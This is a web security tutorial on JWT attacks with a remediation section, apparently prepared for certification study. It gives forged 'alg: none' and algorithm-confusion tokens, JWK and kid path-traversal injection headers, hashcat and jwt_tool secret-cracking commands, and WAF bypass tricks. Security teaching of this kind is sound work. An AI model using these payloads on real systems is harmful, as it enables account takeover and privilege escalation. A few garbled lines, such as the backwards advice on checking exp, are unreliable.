JWT Attacks

JSON Web Tokens (JWT) are widely used for authentication and session management. However, weak implementation practices ·such as accepting the "none" algorithm, failing to verify signatures, or using weak secrets ·allow attackers to forge authentication tokens, escalate privileges, or bypass security controls entirely.

Critical BSCP Intermediate

Real-World Analogy

The Unforgeable Wristband

Imagine a concert venue that issues wristbands to prove you paid for entry. A wristband says "VIP access, valid until midnight, issued by Venue ABC."

A good wristband is tamper-proof: it's signed with the venue's private stamp that only the venue can create. When the bouncer checks your wristband, they verify the stamp is genuine using the venue's public verification key.

But a poorly designed system might:

  • Forget to check the stamp at all · the bouncer just reads the text, assumes it's real, and lets you in
  • Accept wristbands you stamped yourself · the bouncer uses the public verification key to verify your signature, which works because anyone can encrypt with the public key
  • Accept wristbands with "no signature" · some wristbands claim they're unsigned; the bouncer trusts these anyway

That's JWT vulnerabilities: the token looks legitimate and has a signature, but the server either doesn't verify it, accepts weak signatures, or trusts signatures created with information the attacker has access to.

If the app uses RS256 (asymmetric), try the RS256→HS256 algorithm confusion attack. Obtain the server's public key (often at /.well-known/jwks.json or in an error response). Chain it: JWT forgery → impersonate admin → IDOR as admin → read all user data. Or: JWT with modified sub claim → access other users' accounts.

Understanding JWT Structure

A JWT consists of three base64url-encoded parts separated by dots: header.payload.signature

Header

{
  "alg": "HS256",
  "typ": "JWT"
}

The header specifies the algorithm used to sign the token (HS256, RS256, none, etc.) and the token type.

Payload (Claims)

{
  "sub": "user123",
  "username": "alice",
  "role": "user",
  "email": "alice@example.com",
  "iat": 1704067200,
  "exp": 1704070800
}

The payload contains claims (data about the user). Standard claims include:

  • sub · Subject (user ID)
  • iat · Issued At (timestamp when token was created)
  • exp · Expiration (timestamp when token expires)
  • Custom claims like role, username, permissions

Signature

The signature is computed by hashing the header and payload with a secret key:

HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)

Complete Example

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDQwNzA4MDB9.X3x4KZ9pQ2mR8vN1fL2kA9...

You can decode the header and payload by base64url-decoding them (they're just JSON). The signature is what proves authenticity ·only someone with the secret key can create a valid signature.

How JWT Attacks Work

Most JWT vulnerabilities stem from incorrect signature verification. Here are the main attack types:

1. Algorithm Confusion (RS256 → HS256)

The server expects a token signed with RS256 (asymmetric, using a private key). But you change the algorithm to HS256 (symmetric, using a shared secret) and sign the token with the server's public key.

Why this works: The server has the public key but uses it to verify HS256 tokens. Since HS256 is symmetric, you can compute a valid signature using the public key as the HMAC secret.

2. "None" Algorithm (alg: none)

Change the algorithm header to "alg": "none" and remove the signature entirely. Some servers blindly accept tokens with no signature.

3. Weak Secret Brute-Force

The server uses HS256 with a weak secret (common words, short strings). Brute-force the secret using hashcat or jwt_tool.

4. JWT Header Injection (kid, jku, x5u)

The JWT header can include parameters like kid (key ID), jku (JWK Set URL), or x5u (certificate URL). Inject URLs pointing to your attacker-controlled server to provide your own public key.

5. Privilege Escalation via Payload Modification

Even if you can't forge a valid signature, if the server doesn't verify the signature properly, you can modify the payload claims (change "role": "user" to "role": "admin").

Where to Look for JWTs

  • Authorization header: Authorization: Bearer eyJ...
  • Cookies: Common names: jwt, session, token, auth, id_token
  • Custom headers: X-Token, X-Auth-Token, X-JWT
  • Request body: Some APIs accept JWTs in POST parameters or JSON body
  • Client-side storage: Check browser DevTools → Application tab → Local Storage, Session Storage, Cookies
  • Response headers: Some endpoints return JWTs in responses for use in subsequent requests

Burp Suite Workflow

1
Install JWT Editor Extension: Go to Extender → BApp Store → search for "JWT Editor" → Install. This makes JWT modification much easier.
2
Find the JWT: Browse the application and locate requests containing JWTs. Check Authorization headers, cookies, and request bodies. Right-click any request with a JWT and send to Repeater.
3
Decode the JWT: In the JWT Editor extension (look for the "JSON Web Token" tab at the bottom), you can decode and edit the header and payload. Modify the payload to change claims (e.g., change "role": "user" to "role": "admin").
4
Test "alg: none": Change the algorithm header to "alg": "none" in the JWT Editor. Remove the signature (leave it empty). Send the request and see if it's accepted.
5
Test RS256 → HS256 confusion: Change "alg": "RS256" to "alg": "HS256". In the JWT Editor, set the secret to the server's public key (copy from the JWKS endpoint or extract from a valid token signature). Re-sign the token and send.
6
Brute-force weak secrets: Export the JWT and use jwt_tool or hashcat to brute-force the secret: 
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
If a secret is found, use it to re-sign your modified tokens.
7
Test header injection (jku/x5u): If the JWT has a jku (JWK Set URL) or x5u (certificate URL) header, try changing it to point to your attacker-controlled server. Generate your own RSA key pair, host a JWKS JSON file, and use your private key to sign tokens.
8
Test claim modification: Change claims like role, permissions, sub, email, etc. If the server doesn't validate the signature, these changes will be accepted.

Payloads & Exploitation Techniques

Algorithm Confusion: RS256 to HS256

Original token (valid RS256 token):

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SIGNATURE

Modified token (HS256 with public key as secret):

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.NEWSIGNATURE

Extract the server's public key from the JWKS endpoint (/.well-known/jwks.json) or from an existing valid token. Use it as the HMAC secret to sign your modified token.

"None" Algorithm Attack

Modified token:

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.

The signature portion (after the second dot) is empty. The server must not validate signatures for tokens with alg: none.

Weak Secret Brute-Force (Using jwt_tool)

# Clone jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Use the web UI or CLI to crack weak secrets
python3 jwt_tool.py -M crack -t eyJ... -w /usr/share/wordlists/rockyou.txt

Claim Modification Without Signature Verification

Original payload:

{"sub": "user123", "role": "user", "email": "alice@example.com"}

Modified payload:

{"sub": "user123", "role": "admin", "email": "alice@example.com"}

If the signature is not properly validated, the server will accept this modified token and grant admin privileges.

JWK Header Injection

Embed your own public key in the JWT header:

{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "use": "sig",
    "n": "YOUR_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  }
}

Sign the payload with your private key. The server uses the key embedded in the header to verify the signature, which you just signed with your private key.

Key ID (kid) Parameter Injection

If the JWT has a kid parameter, try injecting path traversal or SQL injection:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}

Some servers load the key based on the kid value from a file path. Path traversal might load a predictable key (like /dev/null, which is empty, effectively weakening the signature).

Expiration (exp) Claim Manipulation

Modify the expiration timestamp to extend token validity:

{"sub": "user123", "exp": 9999999999}

If the signature is not verified, the token won't expire.

Using hashcat for Secret Brute-Force

hashcat -a 0 -m 16500 jwt.txt wordlist.txt -o cracked.txt

Mode 16500 is for HMAC-SHA256. Once cracked, use the secret to re-sign modified tokens.

WAF Bypass Techniques

JWT attacks often bypass traditional WAF rules because the attack happens within the token itself, not the HTTP headers.

Token in Different Locations

If Authorization header is filtered, try injecting JWTs as:

  • Cookie: jwt=eyJ...
  • Custom header: X-JWT: eyJ...
  • Request body parameter: {"token": "eyJ..."}
  • URL parameter: ?token=eyJ...

Algorithm Variation

Try different signature algorithms that might be accepted:

  • "alg": "HS512" instead of HS256
  • "alg": "none" (already mentioned, but worth retrying if first attempt failed)
  • "alg": "HMAC" or other variations

Case Variation and Whitespace

Some systems normalize algorithm names. Try:

  • "alg": "hs256" (lowercase)
  • "alg": "HS256 " (trailing space)

Base64 Encoding Variation

Some decoders accept both standard and URL-safe base64. Try different variants, though JWT should use URL-safe encoding.

Exploitation & Impact

Privilege Escalation

Modify claims to gain admin or elevated privileges. Change "role": "user" to "role": "admin" and bypass authentication checks.

Session Hijacking and Impersonation

Forge a JWT with any user ID (change "sub": "user123" to "sub": "admin123"). Access other users' accounts or perform actions as them.

Bypassing Authentication

If signature verification is not implemented, create arbitrary tokens from scratch. No existing token needed ·just construct a JWT with claims for any user and any role.

Extending Token Validity

Modify expiration claims to keep tokens valid indefinitely. Combine with privilege escalation for persistent unauthorized access.

Accessing Protected Resources

Use forged JWTs to access APIs, download files, modify data, or perform other actions requiring authentication.

Chained Attacks

JWT attacks often lead to other vulnerabilities. For example, escalate to admin, then use admin functionality to upload malicious files or access sensitive data.

Remediation

Always Verify the Signature

Node.js (jsonwebtoken):

const jwt = require('jsonwebtoken');
try {
  const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
  // Token is valid
} catch (err) {
  // Token is invalid or signature verification failed
  res.status(401).send('Unauthorized');
}

Whitelist Allowed Algorithms

Always specify which algorithms you accept. Never accept "none":

jwt.verify(token, secret, { algorithms: ['HS256'] });

Use Strong Secrets (for HS256)

If using HMAC-based signing, use a cryptographically secure random secret with at least 256 bits of entropy:

const secret = crypto.randomBytes(32).toString('hex'); // 256-bit secret

Prefer RS256 (Asymmetric Signing) Over HS256

Use RSA key pairs where the server has a private key for signing and a public key for verification. This prevents the RS256 → HS256 confusion attack.

Pin the Algorithm Server-Side

Don't trust the algorithm specified in the JWT header. Hard-code the expected algorithm on the server:

// Server always expects HS256, ignores header
jwt.verify(token, secret, { algorithms: ['HS256'] });

Validate Expiration Strictly

Check that the exp claim is in the past and reject expired tokens. Most JWT libraries do this automatically if verification is enabled.

Set Short Expiration Times

Use short-lived tokens (5-15 minutes) and implement token refresh mechanisms. Even if a token is compromised, its window of validity is minimal.

Validate the kid Parameter

If using key IDs, validate that the kid is in a whitelist of valid key IDs. Don't allow arbitrary file paths or URLs.

Disable External URL Resolution in JWK Headers

If your application loads JWK Sets from URLs specified in the JWT header (jku), restrict which URLs are allowed. Better yet, disable this feature entirely and hard-code key sources.

Use a Secure JWT Library

Use well-maintained libraries like jsonwebtoken (Node.js), PyJWT (Python), or similar. Avoid rolling your own JWT implementation.

Common Beginner Mistakes

Don't Fall Into These Traps
  • Not installing the JWT Editor extension: Burp's JWT Editor makes decoding and modifying tokens trivial. Without it, you're manually base64url-encoding and decoding, which is error-prone and slow.
  • Only trying "alg: none": This attack works on some apps but not all. Always also test RS256 → HS256 confusion, which is more common.
  • Forgetting to test claim modification without re-signing: Some servers accept modified claims even without a valid signature. Always try changing claims and sending the modified token as-is.
  • Not checking all token locations: JWTs appear in cookies, headers, body parameters, and local storage. Check DevTools Application tab for tokens in local storage.
  • Assuming the secret is strong: Many developers use weak secrets ("password123", app name, etc.). Always attempt brute-force with hashcat before giving up.
  • Ignoring header parameters like jku and x5u: These can be exploited to point to attacker-controlled key servers. Test them every time.
  • Not trying different algorithms: If HS256 fails, try HS512, RS256, etc. Some servers accept multiple algorithms.
  • Giving up if the first JWT attack fails: JWT vulnerabilities come in many flavors. Try each attack systematically: none, RS256→HS256, weak secret, claim modification, header injection.
